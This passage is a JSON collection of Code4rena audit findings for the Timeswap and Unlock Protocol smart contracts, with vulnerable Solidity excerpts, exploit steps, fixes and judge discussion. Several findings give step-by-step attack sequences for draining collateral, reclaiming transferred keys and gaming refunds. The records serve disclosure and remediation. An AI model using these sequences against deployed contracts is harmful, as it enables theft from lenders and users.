      "content": "_Submitted by WatchPug_\n\n<https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/BorrowMath.sol#L19-L53>\n\nThis issue is similar to the two previous issues related to `state.y` manipulation. Unlike the other two issues, this function is not on `TimeswapPair.sol` but on `TimeswapConvenience.sol`, therefore this can not be solved by adding `onlyConvenience` modifier.\n\nActually, we believe that it does not make sense for the caller to specify the interest they want to pay, we recommend removing this function.\n\n#### Impact\n\n*   When `pool.state.y` is extremely large, many core features of the protocol will malfunction, as the arithmetic related to `state.y` can overflow. For example:\n\nLendMath.check(): <https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/LendMath.sol#L28-L28>\n\nBorrowMath.check(): <https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L31-L31>\n\n*   An attacker can set `state.y` to a near overflow value, then `lend()` to get a large amount of extra interest (as Bond tokens) with a small amount of asset tokens. This way, the attacker can steal funds from other lenders and liquidity providers.\n\n**[Mathepreneur (Timeswap) confirmed](https://github.com/code-423n4/2022-01-timeswap-findings/issues/169)**\n\n",
      "summary": "\nThis bug report is about an issue related to the manipulation of the `state.y` variable in the Timeswap protocol. It is located in the `TimeswapConvenience.sol` file and cannot be solved by adding the `onlyConvenience` modifier. The bug report recommends removing the function as it does not make sense for the caller to specify the interest they want to pay. \n\nThe impact of this bug is twofold. Firstly, when `pool.state.y` is extremely large, many core features of the protocol will malfunction as the arithmetic related to `state.y` can overflow. This is demonstrated in the LendMath.check() and BorrowMath.check() functions. Secondly, an attacker can set `state.y` to a near overflow value, then use the `lend()` function to get a large amount of extra interest with a small amount of asset tokens, thus stealing funds from other lenders and liquidity providers. This bug was confirmed by Mathepreneur (Timeswap).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-01-timeswap",
      "github_link": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/169",
      "tags": [],
      "finders": []
    },
    {
      "id": "25631",
      "title": "[H-01] `TimeswapPair.sol#borrow()` Improper implementation allows attacker to increase `pool.state.z` to a large value",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\nIn the current implementation, `borrow()` takes a user input value of `zIncrease`, while the actual collateral asset transferred in is calculated at L319, the state of `pool.state.z` still increased by the value of the user's input at L332.\n\nEven though a large number of `zIncrease` means that the user needs to add more collateral, the attacker can use a dust amount `xDecrease` (1 wei for example) so that the total collateral needed is rather small.\n\nPlus, the attacker can always `pay()` the dust amount of loan to get back the rather large amount of collateral added.\n\n<https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L299-L338>\n\n```solidity\nfunction borrow(\n    uint256 maturity,\n    address assetTo,\n    address dueTo,\n    uint112 xDecrease,\n    uint112 yIncrease,\n    uint112 zIncrease,\n    bytes calldata data\n) external override lock returns (uint256 id, Due memory dueOut) {\n    require(block.timestamp < maturity, 'E202');\n    require(assetTo != address(0) && dueTo != address(0), 'E201');\n    require(assetTo != address(this) && dueTo != address(this), 'E204');\n    require(xDecrease > 0, 'E205');\n\n    Pool storage pool = pools[maturity];\n    require(pool.state.totalLiquidity > 0, 'E206');\n\n    BorrowMath.check(pool.state, xDecrease, yIncrease, zIncrease, fee);\n\n    dueOut.debt = BorrowMath.getDebt(maturity, xDecrease, yIncrease);\n    dueOut.collateral = BorrowMath.getCollateral(maturity, pool.state, xDecrease, zIncrease);\n    dueOut.startBlock = BlockNumber.get();\n\n    Callback.borrow(collateral, dueOut.collateral, data);\n\n    id = pool.dues[dueTo].insert(dueOut);\n\n    pool.state.reserves.asset -= xDecrease;\n    pool.state.reserves.collateral += dueOut.collateral;\n    pool.state.totalDebtCreated += dueOut.debt;\n\n    pool.state.x -= xDecrease;\n    pool.state.y += yIncrease;\n    pool.state.z += zIncrease;\n\n    asset.safeTransfer(assetTo, xDecrease);\n\n    emit Sync(maturity, pool.state.x, pool.state.y, pool.state.z);\n    emit Borrow(maturity, msg.sender, assetTo, dueTo, xDecrease, id, dueOut);\n}\n```\n\n<https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L62-L79>\n\n```solidity\nfunction getCollateral(\n    uint256 maturity,\n    IPair.State memory state,\n    uint112 xDecrease,\n    uint112 zIncrease\n) internal view returns (uint112 collateralIn) {\n    uint256 _collateralIn = maturity;\n    _collateralIn -= block.timestamp;\n    _collateralIn *= zIncrease;\n    _collateralIn = _collateralIn.shiftRightUp(25);\n    uint256 minimum = state.z;\n    minimum *= xDecrease;\n    uint256 denominator = state.x;\n    denominator -= xDecrease;\n    minimum = minimum.divUp(denominator);\n    _collateralIn += minimum;\n    collateralIn = _collateralIn.toUint112();\n}\n```\n\n#### Proof of Concept\n\nNear the maturity time, the attacker can do the following:\n\n1.  `borrow()` a dust amount of assets (`xDecrease` = 1 wei) and increase `pool.state.z` to an extremely large value (20x of previous `state.z` in our tests);\n2.  `pay()` the loan and get back the collateral;\n3.  `lend()` a regular amount of `state.x`, get a large amount of insurance token;\n4.  `burn()` the insurance token and get a large portion of the collateral assets from the defaulted loans.\n\n#### Recommendation\n\nConsider making `pair.borrow()` to be `onlyConvenience`, so that `zIncrease` will be a computed value (based on `xDecrease` and current state) rather than a user input value.\n\n**[Mathepreneur (Timeswap) confirmed](https://github.com/code-423n4/2022-01-timeswap-findings/issues/162)**\n\n",
      "summary": "\nA bug has been identified in the Timeswap platform, which is a financial protocol that offers a decentralized, trustless, and permissionless way to swap assets. The bug is related to the `borrow()` function in the TimeswapPair.sol contract. This function takes a user input value of `zIncrease`, while the actual collateral asset transferred in is calculated at L319. Despite this, the state of `pool.state.z` still increases by the value of the user's input at L332.\n\nThis bug can be exploited by an attacker who uses a dust amount `xDecrease` (1 wei for example) so that the total collateral needed is rather small. The attacker can then `pay()` the dust amount of loan to get back the rather large amount of collateral added. This can be followed by `lending()` a regular amount of `state.x`, getting a large amount of insurance token, and then `burning()` the insurance token to get a large portion of the collateral assets from the defaulted loans.\n\nThe bug has been confirmed and the recommendation is to make `pair.borrow()` to be `onlyConvenience`, so that `zIncrease` will be a computed value (based on `xDecrease` and current state) rather than a user input value.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-01-timeswap",
      "github_link": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/162",
      "tags": [],
      "finders": []
    },
    {
      "id": "42359",
      "title": "[M-11] Missing scaling factor in `recordKeyPurchase`?",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_\n\nThe `Unlock.recordKeyPurchase` function computes the `maxTokens` as:\n\n```solidity\nmaxTokens = IMintableERC20(udt).balanceOf(address(this)) * valueInETH / (2 + 2 * valueInETH / grossNetworkProduct) / grossNetworkProduct;\n```\n\nNote that `grossNetworkProduct` was already increased by `valueInETH` in the code before.\nMeaning, the `(2 + 2 * valueInETH / grossNetworkProduct)` part of the computation will almost always be `2` as usually `grossNetworkProduct > 2 * valueInETH`, and thus the `2 * valueInETH / grossNetworkProduct` is zero by integer division.\n\n#### Impact\n\nThe `maxTokens` curve might not be computed as intended and lead to being able to receive more token rewards than intended.\n\n#### Recommended Mitigation Steps\n\nThe comment \"we distribute tokens using asymptotic curve between 0 and 0.5\" should be more clear to indicate how exactly the curve looks like.\nIt could be that a floating-point number was desired instead of the integer division in `2 * valueInETH / grossNetworkProduct`. In that case, consider adding a scaling factor to this term and divide by it at the end of the computation again.\n\n**[julien51 (Unlock Protocol) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/156#issuecomment-991690466):**\n > I am not fully sure I understand what the problem is here?\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/156#issuecomment-1013844481):**\n > I think the warden is raising an issue where `2 * valueInEth / grossNetworkProduct` will more than likely truncate and return `0`. I think this is a valid finding.\n\n**[julien51 (Unlock Protocol) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/156#issuecomment-1068793080):**\n > Hum, we did some tests and could not reproduce here.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/156#issuecomment-1075696998):**\n > I'm not sure how `2 * valueInETH / grossNetworkProduct` does not always lead to some truncation. `grossNetworkProduct` is equal to `valueInETH` in the first call but always greater than `valueInETH` in any subsequent calls.\n\n\n\n",
      "summary": "\nThe bug report is about a function called `Unlock.recordKeyPurchase` which calculates a variable called `maxTokens` using a formula that includes `grossNetworkProduct` and `valueInETH` variables. The issue is that the formula may not always calculate `maxTokens` correctly due to the use of integer division, which can result in a value of 0. This means that the function may distribute more token rewards than intended. The recommended mitigation steps suggest making the curve used in the calculation more clear and potentially using a floating-point number instead of integer division. The developers of the protocol have commented on the issue, with one stating that they were unable to reproduce the problem and another confirming that the issue is valid.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/156",
      "tags": [],
      "finders": []
    },
    {
      "id": "42358",
      "title": "[M-08] Frontrunning `PublicLock.initialize()` can prevent upgrades due to insufficient access control",
      "impact": "MEDIUM",
      "content": "_Submitted by elprofesor, also found by kenzo_\n\nThe unlock protocols base contract `Unlock.sol` uses `setLocktemplate()` to initialize the implementation contract for the `PublicLock` proxy. This function will initialize the relevant `PublicLock` contract which has been deployed separately. `PublicLock.initialize()` does not have any relevant access control and does not prevent arbitrary users from initialising. This means that a malicious user could front run the `setLocktemplate()` forcing the deployer of `PublicLock`'s implementation to redeploy. The process can be repeated, which costs the malicious user less than it would the owner of the Unlock Protocol, potentially unnecessarily draining funds from the development team.\n\n#### Proof of Concept\n\n[Lack of access control on initialize](https://github.com/code-423n4/2021-11-unlock/blob/ec41eada1dd116bcccc5603ce342257584bec783/smart-contracts/contracts/PublicLock.sol#L42-L51)\n\n#### Recommended Mitigation Steps\n\nImplement valid access control on the `PublicLock` contract to ensure only the relevant deployer can `initialize()`.\n\n**[julien51 (Unlock Protocol) disagreed with severity](https://github.com/code-423n4/2021-11-unlock-findings/issues/132)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/132#issuecomment-1075675604):**\n > I agree with the warden, `_publicLockAddress` is deployed separately and hence `initialize` can be called before `setLockTemplate` is called.\n\n\n\n",
      "summary": "\nThe bug report is about a vulnerability found in the Unlock Protocol's `Unlock.sol` contract. This contract uses a function called `setLocktemplate()` to initialize another contract called `PublicLock`. However, this initialization process does not have proper access control, which means that anyone can call the `PublicLock.initialize()` function and potentially cause harm. This could lead to a malicious user forcing the deployer of `PublicLock` to redeploy, causing unnecessary loss of funds for the development team. The report recommends implementing access control on the `PublicLock` contract to prevent this vulnerability. However, there is some disagreement about the severity of this issue among the community. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/132",
      "tags": [],
      "finders": []
    },
    {
      "id": "42357",
      "title": "[M-05] Refund mechanism doesn't take into account that key price can change",
      "impact": "MEDIUM",
      "content": "_Submitted by kenzo, also found by WatchPug and 0x0x0x_\n\nLock manager can change key pricing.\nThe refund mechanism calculates refund according to current key price, not price actually paid.\n\n#### Impact\n\nA user refunding can get less (or more) funds than deserved.\n\n#### Proof of Concept\n\nRefund only takes the current price into account:\n<https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinRefunds.sol#L144:#L152>\n\nLock manager can update key price at any point, and the old price is not saved anywhere:\n<https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinLockCore.sol#L183>\n\nSo if for example a key price has gone down, a user who tried to refund will get less funds than deserved.\n\n#### Recommended Mitigation Steps\n\nConsider saving the amount the user paid, and refund according to that.\nOr having a kind of a price snapshot/version mechanism.\n\n**[julien51 (Unlock Protocol) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/53#issuecomment-976137635):**\n > This is a known issue... but indeed we should show things in the UI to indicate things to users.\n\n**[0xleastwood (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/53#issuecomment-1013832674):**\n > Agree this sounds like an issue! However, I don't think this can be justified as a `high` risk issue. But it does seem that the protocol could leak value and impact users, so marking this as `medium`.\n\n**[julien51 (Unlock Protocol) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/53#issuecomment-1068791889):**\n > We actually are adding a new mechanism to keep track of the last price paid by any user which means we could use it in the next version to solve this issue!\n\n\n\n",
      "summary": "\nThe bug report discusses an issue with the Lock Manager feature in the Unlock Protocol. It states that the refund mechanism for users calculates the refund amount based on the current key price, rather than the price that was actually paid. This means that users may receive more or less funds than they deserve when trying to refund their keys. The report also includes evidence of this issue and suggests that the protocol should save the amount paid by the user or implement a price snapshot mechanism to mitigate this problem. \n\nThe report has been acknowledged by the Unlock Protocol team, but they disagreed with the severity of the issue and commented that it is a known issue that will be addressed in the future. The judge assigned to the case also decreased the severity to medium, stating that while it is still a valid issue, it does not pose a high risk. The Unlock Protocol team also commented that they are working on a new mechanism to keep track of the last price paid by users, which could potentially solve this issue in the next version.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/53",
      "tags": [],
      "finders": []
    },
    {
      "id": "42356",
      "title": "[H-03] `MixinTransfer.sol#transferFrom` Wrong implementation can potentially allows attackers to reverse transfer and cause fund loss to the users",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\n<https://github.com/code-423n4/2021-11-unlock/blob/ec41eada1dd116bcccc5603ce342257584bec783/smart-contracts/contracts/mixins/MixinTransfer.sol#L131-L152>\n\n```solidity\nif (toKey.tokenId == 0) {\n  toKey.tokenId = _tokenId;\n  _recordOwner(_recipient, _tokenId);\n  // Clear any previous approvals\n  _clearApproval(_tokenId);\n}\n\nif (previousExpiration <= block.timestamp) {\n  // The recipient did not have a key, or had a key but it expired. The new expiration is the sender's key expiration\n  // An expired key is no longer a valid key, so the new tokenID is the sender's tokenID\n  toKey.expirationTimestamp = fromKey.expirationTimestamp;\n  toKey.tokenId = _tokenId;\n\n  // Reset the key Manager to the key owner\n  _setKeyManagerOf(_tokenId, address(0));\n\n  _recordOwner(_recipient, _tokenId);\n} else {\n  // The recipient has a non expired key. We just add them the corresponding remaining time\n  // SafeSub is not required since the if confirms `previousExpiration - block.timestamp` cannot underflow\n  toKey.expirationTimestamp = fromKey.expirationTimestamp + previousExpiration - block.timestamp;\n}\n```\n\nBased on the context, L131-136 seems to be the logic of handling the case of the recipient with no key, and L138-148 is handing the case of the recipient's key expired.\n\nHowever, in L131-136, the key manager is not being reset.\n\nThis allows attackers to keep the role of key manager after the transfer, and transfer the key back or to another recipient.\n\n#### Proof of Concept\n\nGiven:\n\n*   Alice owns a key that is valid until 1 year later.\n\n1.  Alice calls `setKeyManagerOf()`, making herself the keyManager;\n2.  Alice calls `transferFrom()`, transferring the key to Bob; Bob might have paid a certain amount of money to Alice upon receive of the key;\n3.  Alice calls `transferFrom()` again, transferring the key back from Bob.\n\n#### Recommendation\n\nConsider resetting the key manager regardless of the status of the recipient's key.\n\n**[julien51 (Unlock Protocol) confirmed](https://github.com/code-423n4/2021-11-unlock-findings/issues/182#issuecomment-991678597):**\n > I _think_ you are onto something here. We will need to investigate further and reproduce to fix!\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/182#issuecomment-1013830991):**\n > @julien51 Just following up if you were able to double-check this?\n\n**[julien51 (Unlock Protocol) confirmed](https://github.com/code-423n4/2021-11-unlock-findings/issues/182#issuecomment-1068786599):**\n > This is indeed valid and I think we will need to \"patch\" this. We're still unsure how but we're exploring multiple ways.\n\n\n\n",
      "summary": "\nThis bug report is about a potential vulnerability in the Unlock Protocol smart contract. The bug allows attackers to retain the role of key manager after a key is transferred to another recipient. This can lead to unauthorized access and manipulation of the key. The report suggests that the key manager should be reset regardless of the status of the recipient's key. The Unlock Protocol team has confirmed the issue and is working on finding a solution.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/182",
      "tags": [],
      "finders": []
    },
    {
      "id": "1090",
      "title": "[M-14] MixinRefunds: frontrun updateKeyPricing() for free profit",
      "impact": "MEDIUM",
      "content": "_Submitted by itsmeSTYJ_\n\nA malicious user is able to withdraw all payments that were paid to a lock owner if the owner increases the keyPrice.\n\n#### Proof of Concept\n\nWhen `updateKeyPricing()` is called to increase the price of a key, it is possible to frontrun this call and buy many keys at the cheaper price then request for a refund at the higher price.\n\n#### Recommendation\n\nKeep track of the price at which keys are purchased so that when you issue a refund, you use the original keyPrice to refund instead of the updated keyPrice\n\n**[julien51 (Unlock Protocol) acknowledged, but disagreed with High severity and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/72#issuecomment-1004133079):**\n > This is only true for locks where there is no penalty. We should make it clear on the front-end that when changing the price it is recommended to set up a penalty (at least temporarily) for the price difference so that no key can be refunded for the full price.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/72#issuecomment-1075679839):**\n > Circling back on this, I'm not sure how a penalty would be correctly applied to all locks. Wouldn't users who wanted to get a refund for their key get penalised if they purchase after the change in key price? I think it would also be safer to update the key price and apply the penalty in the one transaction.\n\n**[julien51 (Unlock Protocol) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/72#issuecomment-1004133079):**\n > I think that is a good finding, but there again (like often) I think this is pretty edgy.\n > The cancellation penalty is pretty easy to apply just to a single lock from the [lock manager's perspective](https://github.com/unlock-protocol/unlock/blob/b7c5a555efc3c2be619cbb942eb67d4008baa049/smart-contracts/contracts/mixins/MixinRefunds.sol#L70). Before changing the lock price, a lock manager can easily apply a penalty for the difference in price. IE if I change the price from 10 to 12, I apply a penalty for 2 and anyone who tries to abuse this will only get a refund of 12-2 = 10.\n >\n > On top of that we're actually storing the amount paid for the latest key as part of our next upgrade to support automatically recurring memberships, which should make things even more robust as anyone will only get re-imbursed based on what they paid...\n\n**[0xleastwood (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/72#issuecomment-1075679839):**\n > Considering the sponsor's comments and after some further discussion on Discord. I think it is more correct to downgrade this to `medium` severity. While it isn't clear, the lock manager is expected to apply a penalty before updating the cost of a membership such that users cannot game the price difference. However, this isn't enforced on-chain or documented anywhere so based on the judge's and warden's context at the time, this seemed like a valid `high` severity issue. It is important to note that users who refund their membership after purchasing a membership post price change will be refunded less than users who purchased their memberships before the price change. The sponsor is looking to integrate these fixes in their next upgrade.\n\n \n\n",
      "summary": "\nThis bug report is about a malicious user being able to withdraw all payments that were paid to a lock owner if the owner increases the keyPrice. The bug was found when the function `updateKeyPricing()` was called to increase the price of a key. It is possible for the malicious user to frontrun this call and buy many keys at the cheaper price then request for a refund at the higher price. To mitigate this, it is recommended to keep track of the price at which keys are purchased so that when refunds are issued, the original keyPrice is used instead of the updated keyPrice.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/72",
      "tags": [
        "Front-Running"
      ],
      "finders": [
        "itsmeSTYJ"
      ]
    },
    {
      "id": "1089",
      "title": "[M-13] Malicious user can get infinite free trial by repeatedly refund and repurchase right before the freeTrial ends",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_\n\nThe current design/implementation allows users who are refunded before to get another `freeTrial`. This can be exploited by malicious users to get an infinite free trial.\n\n#### Proof of Concept\n\nGiven:\n\n*   `keyPrice` is 1 ETH;\n*   `freeTrialLength` is 31 days.\n\nA malicious user can:\n\n1.  Call `purchase()`, pay 1 ETH and get 31 days of `freeTrial` on day 1;\n2.  Call `cancelAndRefund()` on day 30 and get 1 ETH of refund; then call `purchase()` again, pay 1 ETH and get 31 days of `freeTrial` again.\n\nRepeat the steps above and the user can get infinite `freeTrial`.\n\n#### Impact\n\nA malicious third party may provide a service named `freeUnlock`, which will call `cancelAndRefund()` and `purchase()` automatically right before the end of the `freeTrial`. This can cause fund loss to all the owners that provide a `freeTrial`.\n\n#### Recommendation\n\nConsider adding a `mapping(address => uint256) freeTrialEnds` and make sure each address can only get 1 `freeTrial`.\n\n**[julien51 (Unlock Protocol) disputed and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/189#issuecomment-979654912):**\n > Isn't that the case with every free trial system? \n> If they use the same address the lock manager could easily use the hook system to keep track of who already had received a  full refund and not grant it on the 2nd cancellation.\n> The user could still use new addresses all the time, and in that case that would be valid, but that is actually the case with a lot of systems like that :)\n> One of my roommates in college was just subscribing to newspaper and getting the full risk-free refund by using a different name every time (but used the same address)\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/189#issuecomment-1013831584):**\n > While I agree with the warden, there is potential for unlimited free trials. Limiting a free trial to a single address does not resolve the issue as an attacker can generate any number of addresses from a single seed. However, I do understand this is a tricky issue to workaround. \n > \n > So I'm not sure how this should be treated as it does affect how the protocol is intended to operate. Is there any reason for users to not abuse this @julien51 ? Typically with newspapers, you have to provide credit card details, so an individual is really limited by the number of cards they hold.\n\n**[julien51 (Unlock Protocol) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/189#issuecomment-1014073979):**\n > As you noted, there is _no way_ to prevent free trials from being abused which is why by default, locks do *not* have a free trial: they have to be manually explicitly configured. From there, since it's trivial to just create an infinite number of accounts, anyone could just claim free trials over and over from new accounts.\n\n**[0xleastwood (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/189#issuecomment-1014093336):**\n > As per sponsor, trials are not enabled by default. But seeing as this impacts protocol availability through abuse if enabled. I'll mark this as `medium`.\n\n\n\n",
      "summary": "\nA bug report has been issued regarding a vulnerability in WatchPug. The current design/implementation allows users who are refunded before to get another freeTrial, thus allowing malicious users to get an infinite free trial. To exploit this vulnerability, a malicious user can call the purchase() function, pay 1 ETH and get 31 days of freeTrial on day 1. On day 30, the user can then call the cancelAndRefund() function and get 1 ETH of refund. The user can then repeat this process to get an infinite freeTrial. This vulnerability can cause fund loss to all the owners that provide a freeTrial. To fix this issue, the developers should consider adding a mapping(address => uint256) freeTrialEnds and make sure each address can only get 1 freeTrial.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/189",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1088",
      "title": "[M-12] Missing maxNumberOfKeys checks in shareKey and grantKey",
      "impact": "MEDIUM",
      "content": "_Submitted by kenzo_\n\nMore keys can be minted than maxNumberOfKeys since `shareKey` and `grantKey` do not check if the lock is sold out.\n\n#### Impact\n\nMore keys can be minted than intended.\n\n#### Proof of Concept\n\nIn both `shareKey` and `grantKey`, if minting a new token, a new token is simply minted (and `_totalSupply` increased) without checking it against `maxNumberOfKeys`.\nThis is unlike `purchase`, which has the `notSoldOut` modifier.\n\n`grantKey`:\n<https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinGrantKeys.sol#L41:#L42>\n\n`shareKey`:\n<https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinTransfer.sol#L83:#L84>\nBoth functions call `_assignNewTokenId` which does not check maxNumberOfKeys.\n\n<https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinKeys.sol#L311:#L322>\nSo you can say that `_assignNewTokenId` is actually the root of the error, and this is why I am submitting this as 1 finding and not 2 (for grantKey/shareKey).\n\n#### Recommended Mitigation Steps\n\nAdd a check to `_assignNewTokenId` that will revert if we need to record a new key and `maxNumberOfKeys` has been reached.\n\n**[julien51 (Unlock Protocol) confirmed and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/55#issuecomment-1004066282):**\n > This is actually intentional. We want the lock manager to be able to grant keys even if the lock is sold out. Note that the lock manager could also increase the supply if they needed anyway.\n > However, we should take that into account in the `shareKey` flow so I'll mark as confirmed for that flow.\n\n\n\n",
      "summary": "\nA bug report has been submitted by kenzo regarding the vulnerability of the lock system. The bug is that more keys can be minted than the intended maxNumberOfKeys due to the lack of a check in the `shareKey` and `grantKey` functions. This means that more keys than intended can be minted, which could lead to security issues. The root of the issue is the `_assignNewTokenId` function which does not check maxNumberOfKeys. To mitigate this issue, the bug reporter suggests adding a check to `_assignNewTokenId` that will revert if the maxNumberOfKeys has been reached.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/55",
      "tags": [],
      "finders": [
        "kenzo"
      ]
    },
    {
      "id": "1087",
      "title": "[M-11] Missing scaling factor in recordKeyPurchase?",
      "impact": "MEDIUM",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\nThe `Unlock.recordKeyPurchase` function computes the `maxTokens` as:\n\n```solidity\nmaxTokens = IMintableERC20(udt).balanceOf(address(this)) * valueInETH / (2 + 2 * valueInETH / grossNetworkProduct) / grossNetworkProduct;\n```\n\nNote that `grossNetworkProduct` was already increased by `valueInETH` in the code before.\nMeaning, the `(2 + 2 * valueInETH / grossNetworkProduct)` part of the computation will almost always be `2` as usually `grossNetworkProduct > 2 * valueInETH`, and thus the `2 * valueInETH / grossNetworkProduct` is zero by integer division.\n\n## Impact\nThe `maxTokens` curve might not be computed as intended and lead to being able to receive more token rewards than intended.\n\n## Recommended Mitigation Steps\nThe comment \"we distribute tokens using asymptotic curve between 0 and 0.5\" should be more clear to indicate how exactly the curve looks like.\nIt could be that a floating-point number was desired instead of the integer division in `2 * valueInETH / grossNetworkProduct`. In that case, consider adding a scaling factor to this term and divide by it at the end of the computation again.",
      "summary": "\nThis bug report deals with the `Unlock.recordKeyPurchase` function in a Solidity code. The function computes the `maxTokens` based on a curve, but due to an integer division, the curve might not be computed as intended and result in being able to receive more token rewards than intended. \n\nThe recommended mitigation steps are to make the comment \"we distribute tokens using asymptotic curve between 0 and 0.5\" more clear to indicate exactly how the curve looks like. Additionally, if a floating-point number was desired instead of the integer division in `2 * valueInETH / grossNetworkProduct`, a scaling factor should be added to this term and divided by it at the end of the computation again.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/156",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1086",
      "title": "[M-10] Inaccurate fees computation",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel, also found by 0x0x0x_\n\nThe `MixinTransfer.shareKey` function wants to compute a fee such that `time + fee * time == timeRemaining (timePlusFee)`:\n\n```solidity\nuint fee = getTransferFee(keyOwner, _timeShared);\nuint timePlusFee = _timeShared + fee;\n```\n\nHowever, if the time remaining is less than the computed fee time, **the computation changes and a different formula is applied**.\nThe fee is now simply taken on the remaining time.\n\n```solidity\nif(timePlusFee < timeRemaining) {\n  // now we can safely set the time\n  time = _timeShared;\n  // deduct time from parent key, including transfer fee\n  _timeMachine(_tokenId, timePlusFee, false);\n} else {\n  // we have to recalculate the fee here\n  fee = getTransferFee(keyOwner, timeRemaining);\n  // @audit want it such that time + fee * time == timeRemaining, but fee is taken on timeRemaining instead of time\n  time = timeRemaining - fee;\n}\n```\n\nIt should compute the `time` without fee as `time = timeRemaining / (1.0 + fee_as_decimal)` instead, i.e., `time = BASIS_POINTS_DEN * timeRemaining / (transferFeeBasisPoints + BASIS_POINTS_DEN)`.\n\n#### Proof Of Concept\n\nTo demonstrate the difference with a 10% fee and a `_timeShared = 10,000s` which should be credited to the `to` account.\n\nThe correct time plus fee which is reduced from `from` (as in the `timePlusFee < timeRemaining` branch) would be `10,000 + 10% * 10,000 = 11,000`.\n\nHowever, if `from` has not enough time remaining and `timePlusFee >= timeRemaining`, the entire time remaining is reduced from `from` but the credited `time` is computed wrongly as:\n(Let's assume `timeRemaining == timePlusFee`): `time = 11,000 - 10% * 11,000 = 11,000 - 1,100 = 9900`.\n\nThey would receive 100 seconds less than what they are owed.\n\n#### Impact\n\nWhen 